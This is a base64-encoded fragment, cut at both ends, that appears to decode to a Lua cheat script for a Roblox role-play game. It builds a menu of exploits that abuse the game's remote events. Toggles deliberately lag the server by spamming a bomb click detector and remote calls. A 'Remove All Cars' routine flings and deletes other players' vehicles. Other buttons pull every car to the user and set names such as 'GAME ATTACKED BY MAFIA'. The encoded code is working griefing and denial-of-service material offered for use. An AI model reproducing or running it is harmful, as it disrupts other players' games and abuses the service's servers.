24oc3RhdGUpCiAgICAgICAgdG9nZ2xlcy5MYWdQaG9uZSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBsb2NhbCBwaG9uZVBhdGggPSB3b3Jrc3BhY2VGaW5kRmlyc3RDaGlsZChXb3Jrc3BhY2VDb20pRmluZEZpcnN0Q2hpbGQoMDAxX0NvbW1lcmNpYWxTdG9yZXMpRmluZEZpcnN0Q2hpbGQoQ29tbWVyY2lhbFN0b3JhZ2UxKUZpbmRGaXJzdENoaWxkKFN0b3JlKUZpbmRGaXJzdENoaWxkKFRvb2xzKUZpbmRGaXJzdENoaWxkKElwaG9uZSkKICAgICAgICAgICAgaWYgcGhvbmVQYXRoIHRoZW4KICAgICAgICAgICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBsYWdHYW1lV2l0aFBob25lKHBob25lUGF0aCwgOTk5OTk5KQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB3YXJuKFBob25lIG5vdCBmb3VuZC4pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UKICAgICAgICAgICAgcHJpbnQoTGFnIHdpdGggUGhvbmUgZGVhY3RpdmF0ZWQuKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBMYWcgUGhvbmUgUGFyYWdyYXBoClRhYkFkZFBhcmFncmFwaCh7CiAgICBMYWcgSW5mb3JtYXRpb24sCiAgICBUaGUgc2NyaXB0IHN0YXJ0cyB0byBjYXVzZSBsYWcgYWZ0ZXIgMzUgc2Vjb25kcwp9KQoKbG9jYWwgU2VjdGlvbiA9IFRhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IExhZyB3aXRoIEJvbWIKfSkKCgpsb2NhbCBCb21iQWN0aXZlID0gZmFsc2UKClRhYkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gTGFnIHdpdGggQm9tYiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgaWYgVmFsdWUgdGhlbgogICAgICAgICAgICBCb21iQWN0aXZlID0gdHJ1ZQoKICAgICAgICAgICAgbG9jYWwgUGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgIGxvY2FsIENoYXJhY3RlciA9IFBsYXllci5DaGFyYWN0ZXIgb3IgUGxheWVyLkNoYXJhY3RlckFkZGVkV2FpdCgpCiAgICAgICAgICAgIGxvY2FsIFJvb3RQYXJ0ID0gQ2hhcmFjdGVyV2FpdEZvckNoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgIGxvY2FsIFdvcmtzcGFjZVNlcnZpY2UgPSBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpCiAgICAgICAgICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpCiAgICAgICAgICAgIGxvY2FsIEJvbWIgPSBXb3Jrc3BhY2VTZXJ2aWNlV2FpdEZvckNoaWxkKFdvcmtzcGFjZUNvbSlXYWl0Rm9yQ2hpbGQoMDAxX0NyaW1pbmFsV2VhcG9ucylXYWl0Rm9yQ2hpbGQoR2l2ZVRvb2xzKVdhaXRGb3JDaGlsZChCb21iKQoKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBCb21iQWN0aXZlIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgQm9tYiBhbmQgUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBCb21iLkNGcmFtZQogICAgICAgICAgICAgICAgICAgICAgICBmaXJlY2xpY2tkZXRlY3RvcihCb21iLkNsaWNrRGV0ZWN0b3IpIC0tIFRyaWdnZXJzIHRoZSBib21iJ3MgQ2xpY2tEZXRlY3RvcgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMDAwMSkgLS0gTWluaW11bSBkZWxheSB0byBhdm9pZCBjcmFzaGVzCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMDAxKSAKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIEJvbWJBY3RpdmUgZG8KICAgICAgICAgICAgICAgICAgICBpZiBCb21iIGFuZCBSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFZpcnR1YWxJbnB1dE1hbmFnZXIgPSBnYW1lR2V0U2VydmljZShWaXJ0dWFsSW5wdXRNYW5hZ2VyKQogICAgICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyU2VuZE1vdXNlQnV0dG9uRXZlbnQoNTAwLCA1MDAsIDAsIHRydWUsIGdhbWUsIDApIAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMS41KQogICAgICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyU2VuZE1vdXNlQnV0dG9uRXZlbnQoNTAwLCA1MDAsIDAsIGZhbHNlLCBnYW1lLCAwKSAKCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIEV4ZWN1dGVzIHRoZSBGaXJlU2VydmVyIHdpdGggdGhlIHBsYXllcidzIG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IEJvbWIgLi4gUGxheWVyLk5hbWUgLS0gVXNlcyB0aGUgY3VycmVudCBwbGF5ZXIncyBuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2VXYWl0Rm9yQ2hpbGQoUkUpV2FpdEZvckNoaWxkKDFCbG8xd0JvbWIxc1NlcnZlMXIpRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEuNSkgLS0gMS1zZWNvbmQgaW50ZXJ2YWwgZm9yIGNsaWNrIGFuZCBGaXJlU2VydmVyCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVsc2UKICAgICAgICAgICAgLS0gRGVhY3RpdmF0aW5nIHRoZSBmdW5jdGlvbmFsaXR5CiAgICAgICAgICAgIEJvbWJBY3RpdmUgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCn0pCgpUYWJBZGRQYXJhZ3JhcGgoewogICAgTGFnIEluZm9ybWF0aW9uLAogICAgVGhlIHNjcmlwdCBzdGFydHMgdG8gY2F1c2UgbGFnIGFmdGVyIDM1IHNlY29uZHMKfSkKCmxvY2FsIFRhYiA9IFdpbmRvd01ha2VUYWIoe05hbWVzLCBQYXBlcn0pCgpsb2NhbCBpc05hbWVBY3RpdmUgPSBmYWxzZQpsb2NhbCBpc0Jpb0FjdGl2ZSA9IGZhbHNlCgpsb2NhbCBTZWN0aW9uUkdCTmFtZSA9IFRhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IFJHQiBOYW1lCn0pCgpUYWJBZGRUb2dnbGUoewogICAgTmFtZSA9IFJHQiBOYW1lLAogICAgRGVzY3JpcHRpb24gPSBBY3RpdmF0ZSBSR0IgTmFtZSwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgaXNOYW1lQWN0aXZlID0gdmFsdWUKICAgICAgICBwcmludCh2YWx1ZSBhbmQgUkdCIE5hbWUgYWN0aXZhdGVkIG9yIFJHQiBOYW1lIGRlYWN0aXZhdGVkKQogICAgZW5kCn0pCgoKbG9jYWwgU2VjdGlvblJHQkJpbyA9IFRhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IFJHQiBCSU8KfSkKClRhYkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gUkdCIEJJTywKICAgIERlc2NyaXB0aW9uID0gQWN0aXZhdGUgUkdCIEJJTywKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgaXNCaW9BY3RpdmUgPSB2YWx1ZQogICAgICAgIHByaW50KHZhbHVlIGFuZCBSR0IgQklPIGFjdGl2YXRlZCBvciBSR0IgQklPIGRlYWN0aXZhdGVkKQogICAgZW5kCn0pCgoKbG9jYWwgdmlicmFudENvbG9ycyA9IHsKICAgIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCksICAgLS0gUmVkCiAgICBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApLCAgIC0tIEdyZWVuCiAgICBDb2xvcjMuZnJvbVJHQigwLCAwLCAyNTUpLCAgIC0tIEJsdWUKICAgIENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAwKSwgLS0gWWVsbG93CiAgICBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDI1NSksIC0tIE1hZ2VudGEKICAgIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMjU1KSwgLS0gQ3lhbgogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAxNjUsIDApLCAtLSBPcmFuZ2UKICAgIENvbG9yMy5mcm9tUkdCKDEyOCwgMCwgMTI4KSwgLS0gUHVycGxlCiAgICBDb2xvcjMuZnJvbVJHQigyNTUsIDIwLCAxNDcpIC0tIEhvdCBQaW5rCn0KCnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICBpZiBpc05hbWVBY3RpdmUgdGhlbgogICAgICAgICAgICBsb2NhbCByYW5kb21Db2xvciA9IHZpYnJhbnRDb2xvcnNbbWF0aC5yYW5kb20oI3ZpYnJhbnRDb2xvcnMpXQogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1JQTmFtZUNvbG9yLAogICAgICAgICAgICAgICAgWzJdID0gcmFuZG9tQ29sb3IKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxUlBOYW0xZUNvbG8xcilGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBlbmQKICAgICAgICB3YWl0KDAuNykKICAgIGVuZAplbmQpCgpzcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgaWYgaXNCaW9BY3RpdmUgdGhlbgogICAgICAgICAgICBsb2NhbCByYW5kb21Db2xvciA9IHZpYnJhbnRDb2xvcnNbbWF0aC5yYW5kb20oI3ZpYnJhbnRDb2xvcnMpXQogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1JQQmlvQ29sb3IsCiAgICAgICAgICAgICAgICBbMl0gPSByYW5kb21Db2xvcgogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFSUE5hbTFlQ29sbzFyKUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC43KQogICAgZW5kCmVuZCkKCmxvY2FsIFNlY3Rpb25OYW1lcyA9IFRhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IEFkZCBOYW1lcyB0byBQbGF5ZXIKfSkKCmxvY2FsIG5hbWVzID0gewogICAge0Fub255bXVzLCAgQW5vbnltdXMgfSwKICAgIHtQUk8sICBQUk8gfSwKICAgIHtFUlIwUl82NjYsICBFUlIwUl82NjYgfSwKICAgIHtEQVJLTkUxU1NTLCAgREFSS05FMVNTUyB9LAogICAge0dIT1NULCAgR0hPU1QgfSwKICAgIHtKT0tFUiwgIEpPS0VSIH0sCiAgICB7QURNSU4sICBBRE1JTiB9LAogICAge1RVQkVSUzkzLCAgVFVCRVJTIDkzIH0sCiAgICB7Q08wTEtJRCwgIENPMCBMS0lEIH0sCiAgICB7R0FNRSBBVFRBQ0tFRCBCWSBNQUZJQSwgIEdBTUUgQVRUQUNLRUQgQlkgTUFGSUEgfSwKICAgIHtJTkMwTVVOLCAgSU5DME1VTn0sCiAgICB7QkFEIEJPWSwgIEJBRCBCT1kgfQp9Cgpmb3IgXywgbmFtZSBpbiBpcGFpcnMobmFtZXMpIGRvCiAgICBUYWJBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSBOYW1lICAuLiBuYW1lWzFdLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVbMVJQTmFtMWVUZXgxdF1GaXJlU2VydmVyKFJvbGVQbGF5TmFtZSwgbmFtZVsyXSkKICAgICAgICBlbmQKICAgIH0pCmVuZAoKCmxvY2FsIENhclRhYiA9IFdpbmRvd01ha2VUYWIoe0NhciwgY2FyfSkKCi0tIENvbG9ycyBmb3IgUkdCCmxvY2FsIGNvbG9ycyA9IHsKICAgIENvbG9yMy5uZXcoMSwgMCwgMCksICAgICAtLSBSZWQKICAgIENvbG9yMy5uZXcoMCwgMSwgMCksICAgICAtLSBHcmVlbgogICAgQ29sb3IzLm5ldygwLCAwLCAxKSwgICAgIC0tIEJsdWUKICAgIENvbG9yMy5uZXcoMSwgMSwgMCksICAgICAtLSBZZWxsb3cKICAgIENvbG9yMy5uZXcoMSwgMCwgMSksICAgICAtLSBNYWdlbnRhCiAgICBDb2xvcjMubmV3KDAsIDEsIDEpLCAgICAgLS0gQ3lhbgogICAgQ29sb3IzLm5ldygwLjUsIDAsIDAuNSksIC0tIFB1cnBsZQogICAgQ29sb3IzLm5ldygxLCAwLjUsIDApICAgIC0tIE9yYW5nZQp9CgotLSBSZXBsaWNhdGVkIFN0b3JhZ2UgU2VydmljZQpsb2NhbCByZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKQpsb2NhbCByZW1vdGVFdmVudCA9IHJlcGxpY2F0ZWRTdG9yYWdlV2FpdEZvckNoaWxkKFJFKVdhaXRGb3JDaGlsZCgxUGxheWVyMXNDYTFyKQoKLS0gUkdCIENvbG9yIENoYW5nZSBMb2dpYwpsb2NhbCBpc0NvbG9yQ2hhbmdpbmcgPSBmYWxzZQpsb2NhbCBjb2xvckNoYW5nZUNvcm91dGluZSA9IG5pbAoKbG9jYWwgZnVuY3Rpb24gY2hhbmdlQ2FyQ29sb3IoKQogICAgd2hpbGUgaXNDb2xvckNoYW5naW5nIGRvCiAgICAgICAgZm9yIF8sIGNvbG9yIGluIGlwYWlycyhjb2xvcnMpIGRvCiAgICAgICAgICAgIGlmIG5vdCBpc0NvbG9yQ2hhbmdpbmcgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSBQaWNraW5nQ2FyQ29sb3IsCiAgICAgICAgICAgICAgICBbMl0gPSBjb2xvcgogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlbW90ZUV2ZW50RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIHdhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCkNhclRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gUmVtb3ZlIEFsbCBDYXJzLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgb2ZuYXd1Zm4gPSBmYWxzZQoKaWYgb2ZuYXd1Zm4gPT0gdHJ1ZSB0aGVuCiAgICByZXR1cm4KZW5kCm9mbmF3dWZuID0gdHJ1ZQoKbG9jYWwgY2F3d2ZlciA9IE1pbGl0YXJ5Qm9hdEZyZWUgLS0gQ2hhbmdlZCB0byBNaWxpdGFyeUJvYXRGcmVlCmxvY2FsIG9sZGNmZmZmZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTc1NCwgLTIsIDU4KSAtLSBVcGRhdGVkIGNvb3JkaW5hdGVzCndhaXQoMC4zKQoKbG9jYWwgYXJncyA9IHsKICAgIFsxXSA9IFBpY2tpbmdCb2F0LCAtLSBDaGFuZ2VkIHRvIFBpY2tpbmdCb2F0CiAgICBbMl0gPSBjYXd3ZmVyCn0KCmdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFDYTFyKUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQp3YWl0KDEpCgpsb2NhbCB3cmluZmpuCmZvciBfLCBlcnJiIGluIHBhaXJzKGdhbWUud29ya3NwYWNlLlZlaGljbGVzW2dhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lLi5DYXJdR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgIGlmIGVycmJJc0EoVmVoaWNsZVNlYXQpIHRoZW4KICAgICAgICB3cmluZmpuID0gZXJyYgogICAgZW5kCmVuZAoKcmVwZWF0CiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLkhlYWx0aCA9PSAwIHRoZW4gcmV0dXJuIGVuZAogICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgaWYgbm90IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2VhdFBhcnQgPT0gd3JpbmZqbiB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHdyaW5mam4uQ0ZyYW1lCiAgICB0YXNrLndhaXQoKQogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHdyaW5mam4uQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwxLDApCiAgICB0YXNrLndhaXQoKQogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHdyaW5mam4uQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwtMSwwKQogICAgdGFzay53YWl0KCkKdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TZWF0UGFydCA9PSB3cmluZmpuCgpmb3IgXywgd2lmbiBpbiBwYWlycyhnYW1lLndvcmtzcGFjZS5WZWhpY2xlc1tnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uQ2FyXUdldERlc2NlbmRhbnRzKCkpIGRvCiAgICBpZiB3aWZuLk5hbWUgPT0gUGh5c2ljYWxXaGVlbCB0aGVuCiAgICAgICAgd2lmbkRlc3Ryb3koKQogICAgZW5kCmVuZAoKbG9jYWwgRkxJTkdFRCA9IEluc3RhbmNlLm5ldyhCb2R5VGhydXN0LCBnYW1lLndvcmtzcGFjZS5WZWhpY2xlc1tnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uQ2FyXS5DaGFzc2lzLk1hc3MpIApGTElOR0VELkZvcmNlID0gVmVjdG9yMy5uZXcoNTAwMDAsIDAsIDUwMDAwKSAKRkxJTkdFRC5OYW1lID0gU1VOVEVSSVVNIEhVQiBGTElORwpGTElOR0VELkxvY2F0aW9uID0gZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLkNhcl0uQ2hhc3Npcy5NYXNzLlBvc2l0aW9uCgpmb3IgXywgd3Z3dndhc2MgaW4gcGFpcnMoZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNHZXRDaGlsZHJlbigpKSBkbwogICAgZm9yIF8sIGFzY2VnciBpbiBwYWlycyh3dnd2d2FzY0dldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgaWYgYXNjZWdyLk5hbWUgPT0gVmVoaWNsZVNlYXQgdGhlbgogICAgICAgICAgICBsb2NhbCB0YXJnZXRjYXIgPSBhc2NlZ3IKICAgICAgICAgICAgbG9jYWwgdGV0ID0gSW5zdGFuY2UubmV3KEJvZHlWZWxvY2l0eSwgZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLkNhcl0uQ2hhc3Npcy5NYXNzKQogICAgICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsbWF0aC5odWdlLG1hdGguaHVnZSkKICAgICAgICAgICAgdGV0LlAgPSAxMjUwCiAgICAgICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICB0ZXQuTmFtZSA9ICNtT1ZPT0VQRiQjQEYkI0dFUkUuLlZFV1ZXCiAgICAgICAgICAgIGZvciBtPTEsMjUgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHBvcyA9IHt4PTAsIHk9MCwgej0wfQogICAgICAgICAgICAgICAgcG9zLnggPSB0YXJnZXRjYXIuUG9zaXRpb24uWAogICAgICAgICAgICAgICAgcG9zLnkgPSB0YXJnZXRjYXIuUG9zaXRpb24uWQogICAgICAgICAgICAgICAgcG9zLnogPSB0YXJnZXRjYXIuUG9zaXRpb24uWgogICAgICAgICAgICAgICAgcG9zLnggPSBwb3MueCArIHRhcmdldGNhci5WZWxvY2l0eS5YICAyCiAgICAgICAgICAgICAgICBwb3MueSA9IHBvcy55ICsgdGFyZ2V0Y2FyLlZlbG9jaXR5LlkgIDIKICAgICAgICAgICAgICAgIHBvcy56ID0gcG9zLnogKyB0YXJnZXRjYXIuVmVsb2NpdHkuWiAgMgogICAgICAgICAgICAgICAgaWYgcG9zLnkgPSAtMjAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lLndvcmtzcGFjZS5WZWhpY2xlc1tnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uQ2FyXS5DaGFzc2lzLk1hc3MuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygwLDEwMDAsMCkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBnYW1lLndvcmtzcGFjZS5WZWhpY2xlc1tnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uQ2FyXS5DaGFzc2lzLk1hc3MuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCxwb3MueSxwb3MueikpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBnYW1lLndvcmtzcGFjZS5WZWhpY2xlc1tnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uQ2FyXS5DaGFzc2lzLk1hc3MuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCxwb3MueSxwb3MueikpICsgVmVjdG9yMy5uZXcoMCwtMiwwKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZ2FtZS53b3Jrc3BhY2UuVmVoaWNsZXNbZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLkNhcl0uQ2hhc3Npcy5NYXNzLkNGcmFtZSA9IENGcmFtZS5uZXcoVmVjdG9yMy5uZXcocG9zLngscG9zLnkscG9zLnopKSAgQ0ZyYW1lLm5ldygwLDAsMikKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIGdhbWUud29ya3NwYWNlLlZlaGljbGVzWwpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uQ2FyXS5DaGFzc2lzLk1hc3MuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCxwb3MueSxwb3MueikpICBDRnJhbWUubmV3KDIsMCwwKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKdGFzay53YWl0KCkKbG9jYWwgYXJncyA9IHsKICAgIFsxXSA9IERlbGV0ZUFsbFZlaGljbGVzCn0KCmdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFDYTFyKUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCndhaXQoKQpsb2NhbCB0ZXQgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5LCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQpCnRldC5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSxtYXRoLmh1Z2UsbWF0aC5odWdlKQp0ZXQuUCA9IDEyNTAKdGV0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwwLDApCnRldC5OYW1lID0gI21PVk9PRVBGJCNARiQjR0VSRS4uVkVXVlcKd2FpdCgwLjEpCmZvciBtPTEsMiBkbyAKICAgIHRhc2sud2FpdCgpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2ZmZmZmCmVuZAp3YWl0KDEpCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZmZmZmYKd2FpdCgpCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydEZpbmRGaXJzdENoaWxkKCNtT1ZPT0VQRiQjQEYkI0dFUkUuLlZFV1ZXKURlc3Ryb3koKQp3YWl0KDAuMikKb2ZuYXd1Zm4gPSBmYWxzZQogICAgZW5kCn0pCgpDYXJUYWJBZGRQYXJhZ3JhcGgoe0luZm9ybWF0aW9uLCBJdCdzIHJlY29tbWVuZGVkIHRvIHVzZSB0aGlzIHR3aWNlIHRvIGVuc3VyZSBhbGwgdmVoaWNsZXMgYXJlIHJlbW92ZWR9KQoKQ2FyVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBCcmluZyBBbGwgQ2FycywKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGZvciBfLCB2IGluIG5leHQsIHdvcmtzcGFjZS5WZWhpY2xlc0dldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgdlNldFByaW1hcnlQYXJ0Q0ZyYW1lKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJHZXRQcmltYXJ5UGFydENGcmFtZSgpKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWJBZGRQYXJhZ3JhcGgoe0luZm9ybWF0aW9uLCBCcmluZ3MgYWxsIGNhcnMgaW4gdGhlIHNlcnZlciB0byB5b3V9KQoKLS0gU3BlZWQgVjEgU2VjdGlvbgpsb2NhbCBTcGVlZFNlY3Rpb24gPSBDYXJUYWJBZGRTZWN0aW9uKHtTcGVlZCBWMX0pCgpsb2NhbCBTcGVlZCA9IDUwCmxvY2FsIFR1cmJvID0gNTAKCmxvY2FsIGZ1bmN0aW9uIENoYW5nZUNhclNwZWVkQW5kVHVyYm8oc3BlZWRWYWx1ZSwgdHVyYm9WYWx1ZSkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2FyID0gd29ya3NwYWNlLlZlaGljbGVzRmluZEZpcnN0Q2hpbGQocGxheWVyLk5hbWUgLi4gQ2FyKQoKICAgIGlmIGNhciB0aGVuCiAgICAgICAgbG9jYWwgYm9keSA9IGNhckZpbmRGaXJzdENo